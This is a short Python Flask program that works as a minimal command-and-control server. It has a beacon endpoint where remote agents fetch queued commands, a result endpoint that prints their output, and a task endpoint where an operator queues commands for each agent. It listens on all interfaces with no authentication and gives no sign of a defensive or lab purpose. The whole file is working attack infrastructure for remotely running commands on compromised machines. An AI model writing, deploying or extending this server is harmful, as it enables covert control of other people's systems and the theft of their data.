from flask import Flask, request, jsonify

app = Flask(__name__)

# In-memory task list
tasks = {}

@app.route('/beacon', methods=['POST'])
def beacon():
    agent_id = request.json.get('id')
    if agent_id in tasks and tasks[agent_id]:
        task = tasks[agent_id].pop(0)
        return jsonify({"task": task})
    else:
        return jsonify({"task": None})

@app.route('/result', methods=['POST'])
def result():
    agent_id = request.json.get('id')
    output = request.json.get('output')
    print(f"[+] Result from {agent_id}: {output}")
    return jsonify({"status": "received"})

@app.route('/task', methods=['POST'])
def task():
    agent_id = request.json.get('id')
    command = request.json.get('command')
    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(command)
    return jsonify({"status": "task queued"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
